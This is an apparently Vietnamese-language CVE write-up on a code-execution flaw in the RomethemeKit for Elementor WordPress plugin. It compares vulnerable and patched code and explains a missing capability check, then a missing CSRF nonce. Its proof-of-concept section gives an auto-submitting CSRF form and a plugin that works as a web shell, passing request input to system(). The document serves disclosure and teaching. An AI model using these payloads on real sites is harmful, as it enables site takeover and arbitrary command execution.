---
title: CVE-2025-30911 Analysis & POC
description: Security Vulnerability in WordPress RTMKit Plugin.
date: 2025-12-03 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, remote code execution]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng **Improper Control of Generation of Code ('Code Injection')** trong **Rometheme RomethemeKit For Elementor** cho phép xảy ra **Command Injection**. Vấn đề này ảnh hưởng đến **RomethemeKit For Elementor** từ n/a đến phiên bản **1.5.4**.

* **CVE ID**: [CVE-2025-30911](https://www.cve.org/CVERecord?id=CVE-2025-30911)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 1.5.4
* **Patched Versions**: 1.5.5
* **CVSS severity**: High (9.9)
* **Required Privilege**: Subcriber
* **Product**: [WordPress RTMKit Plugin](https://wordpress.org/plugins/rometheme-for-elementor/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **RTMKit**:  
    * `1.5.3` – **vulnerable**  
    * `1.5.5` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
> [!NOTE]
> Lỗ hổng được công bố xảy ra đến phiên bản **1.5.4** nhưng thực sự nó đã được vá một phần trong phiên bản này, nên tôi chọn phiên bản **1.5.3** để phân tích

**Trong phiên bản lỗi (v1.5.3):**

```php {title="template.php v1.5.3" data-open=true hl_lines=[21,23]}
public function install_requirements()
{
    include_once ABSPATH . 'wp-admin/includes/plugin.php';
    include_once ABSPATH . 'wp-admin/includes/file.php';
    include_once ABSPATH . 'wp-admin/includes/misc.php';
    include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';

    $plugin = $_POST['plugin'];
    $plugin_file = WP_PLUGIN_DIR . '/' . $plugin;
    $plugin_slug = dirname($plugin);

    if (file_exists($plugin_file)) {
        // Activate the plugin if already installed but inactive
        ob_start();
        activate_plugin($plugin);
        ob_clean();
        ob_end_clean();
        wp_send_json_success("Install and Activate Successfully");
    } else {
        ob_start();
        $plugin_download_url = "https://downloads.wordpress.org/plugin/{$plugin_slug}.latest-stable.zip"; // Adjust URL structure
        $upgrader = new \Plugin_Upgrader();
        $result = $upgrader->install($plugin_download_url);

        if (is_wp_error($result)) {
            wp_send_json_error();
        }
        $activate_result = activate_plugin($plugin);
        if (is_wp_error($activate_result)) {
            wp_send_json_error('Plugin installed but failed to activate: ' . $activate_result->get_error_message());
        }

        wp_send_json_success('Plugin installed and activated successfully.');
    }
}
```

Hàm `install_requirements()` cho phép tải và kích hoạt plugin dựa trên giá trị của `$_POST['plugin']`:
* Nếu plugin đã tải mà chưa active thì thực hiện active:
```php
if (file_exists($plugin_file)) {
    // Activate the plugin if already installed but inactive
    ob_start();
    activate_plugin($plugin);
    ob_clean();
    ob_end_clean();
    wp_send_json_success("Install and Activate Successfully");
}
```
* Nếu plugin chưa tải thì thực hiện tải nó về

Tuy nhiên, hàm này không có bất kỳ kiểm tra quyền người dùng nào.

Sang phiên bản `v1.5.4`, nhà phát triển đã vá một phần bằng cách thêm đoạn:

```php {title="template.php v1.5.4" data-open=true hl_lines=[]}
if (!current_user_can('manage_options')) {
    wp_die();
}
```

`manage_options` là quyền chỉ dành cho **Administrator**, vì vậy giờ đây chỉ tài khoản Admin mới có thể gọi được chức năng này. Việc này đã ngăn được user thông thường (**Subscriber**, **Author**, v.v.) và người không đăng nhập trực tiếp khai thác lỗ hổng.

Tuy nhiên, bản vá này vẫn chưa đủ an toàn. Vì sao?

Mặc dù đã giới hạn quyền là **Administrator**, nhưng hàm này không có cơ chế chống **CSRF (Cross-Site Request Forgery)**. Điều này có nghĩa là:

> Nếu **Administrator** đang đăng nhập vào website WordPress và truy cập vào một trang web độc hại do attacker kiểm soát thì trang đó có thể bí mật gửi một request (POST) tới `install_requirements` request này sẽ được thực hiện với quyền của **Administrator**, vì trình duyệt đang mang theo cookie đăng nhập.

Đến phiên bản **v1.5.5**, nhà phát triển mới thực sự vá hoàn chỉnh lỗ hổng bằng cách thêm kiểm tra nonce:

```php
if (!isset($_POST['wpnonce']) ||  !wp_verify_nonce($_POST['wpnonce'], 'rtm_template_nonce')) {
    wp_send_json_error('Access Denied');
    wp_die();
}
```

Khi kết hợp cả hai lớp bảo vệ:
* `current_user_can('manage_options')` → kiểm tra quyền
* `wp_verify_nonce()` → chống CSRF

Thì lỗ hổng mới được vá đúng cách.
## Analysis
Plugin đã đăng ký một ajax dành cho người dùng đã đăng nhập (`wp_ajax_`):

```php
add_action('wp_ajax_install_requirements', [$this, 'install_requirements']);
```

Khi truy cập đến endpoint `/wp-admin/admin-ajax.php` với `action=install_requirements` thì callback `install_requirements` được gọi.

## Flow
{{< mermaid >}}
graph TD
A["Administrator is logged in to the WordPress site"]
--> B["Administrator visits a malicious website controlled by the attacker"]
B --> C["Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements"]
C --> D["Browser automatically includes Administrator cookies"]
D --> E["WordPress treats the request as coming from an authenticated Admin"]
E --> F["install_requirements() is executed without nonce validation"]
F --> G["Untrusted $_POST['plugin'] is processed"]
G --> H["Plugin_Upgrader->install()"]
H --> I["activate_plugin()"]
I --> J["Malicious plugin is installed and activated"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo trang web chứa payload và gửi cho Administrator:

```html {title="payload" data-open=true}
<html>
  <body>
    <form action="http://localhost/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="install&#95;requirements" />
      <input type="hidden" name="plugin" value="malicious&#95;plugin&#47;malicious&#95;plugin&#95;dir&#46;php" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
2. Khi Administrator truy cập lần 2, plugin sẽ được active

Ví dụ plugin:

```php
if (!defined('ABSPATH')) {
    exit;
}

add_action('init', function () {
    if (isset($_REQUEST['cmd'])) {
        system($_REQUEST['cmd']);
    }
});
```

3. Thực hiện RCE

![Result](result.png "Kết quả")

## Conclusion

Lỗ hổng trong **RTMKit <= 1.5.4** nằm ở `install_requirements()`, khi hàm này xử lý trực tiếp giá trị `$_POST['plugin']` để cài đặt và kích hoạt plugin mà thiếu kiểm soát đầy đủ. Phiên bản **1.5.4** đã thêm kiểm tra quyền với `current_user_can('manage_options')` nhưng vẫn thiếu bảo vệ **CSRF**, cho phép attacker lợi dụng **Administrator** đang đăng nhập để gửi request ngầm và cài plugin độc hại. Chỉ đến **v1.5.5**, việc kết hợp thêm `wp_verify_nonce()` mới vá kín lỗ hổng và chặn được nguy cơ **RCE**.

## Key Takeaways

* Luôn kiểm tra quyền và **nonce** cho mọi AJAX endpoint.
* Không xử lý trực tiếp input người dùng với các hành động nhạy cảm như cài/kích hoạt plugin.
* Kiểm tra quyền thôi là chưa đủ, phải có chống **CSRF**.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress RTMKit Plugin <= 1.5.4 is vulnerable to Remote Code Execution (RCE)](https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-romethemekit-for-elementor-plugin-1-5-4-arbitrary-plugin-installation-activation-to-rce-vulnerability)